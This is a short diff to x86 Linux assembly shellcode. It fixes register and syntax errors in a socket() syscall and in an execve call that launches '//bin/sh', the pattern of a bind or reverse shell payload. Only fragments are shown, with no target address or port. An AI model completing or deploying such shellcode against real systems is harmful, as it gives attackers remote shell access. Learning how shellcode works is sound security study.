@@ -14,7 +14,7 @@ _start:
   xor ecx, ecx        ; zeroize ECX register
   xor edx, edx        ; zeroize EDX register
   
-  mov al, 0x167       ; syscall socket()
+  mov ax, 0x167       ; syscall socket()
   mov bl, 0x2         ; AF_INET = 2
   mov cl, 0x1         ; SOCKET_STREAM = 1
   int 0x80            ; interrupt vector
@@ -76,9 +76,9 @@ _start:
   mov ebx, esp       ; '//bin/sh' -> ESP
   
   push eax
-	mov edx, esp
+  mov edx, esp
 	
   push ebx
   mov ecx, esp
-  mov al 0x0b        ; syscall execve()
+  mov al, 0xb       ; syscall execve()
   int 0x80
